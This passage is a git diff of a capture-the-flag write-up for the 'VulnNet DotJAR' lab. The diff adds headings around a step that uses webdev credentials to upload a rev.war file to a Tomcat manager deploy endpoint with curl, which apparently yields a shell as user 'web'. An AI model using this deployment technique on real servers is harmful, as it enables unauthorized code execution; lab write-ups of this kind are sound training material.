@@ -243,10 +243,13 @@ webdev:**********$Fa@21
 <img width="1129" height="720" alt="image" src="https://github.com/user-attachments/assets/04938d49-0cde-46a5-a273-f31cad2e7035" />
 
 <br>
+<br>
 
 <img width="1131" height="718" alt="image" src="https://github.com/user-attachments/assets/5f6dfabc-7515-44b5-bf3f-16ee778e6a7c" />
 
-<br>
+<br><br>
+<h3>Upload <code>rev.war</code></h3>
+
 
 ```bash
 :~/VulnNetDotJAR# curl --upload-file rev.war -u webdev:'**********$Fa@21' 'http://dotjar.thm:8080/manager/text/deploy?path=/'
@@ -257,7 +260,8 @@ OK - Deployed application at context path [/rev.war]
 
 <img width="1223" height="193" alt="image" src="https://github.com/user-attachments/assets/f8fd29d2-aaa1-4cbc-b672-6667b79e96ca" />
 
-<br>
+<br><br>
+<h3>Shell as <code>web</code></h3>
 
 ```bash
 web@ip-xx-xxx-xx-xxx:/$ cd /home
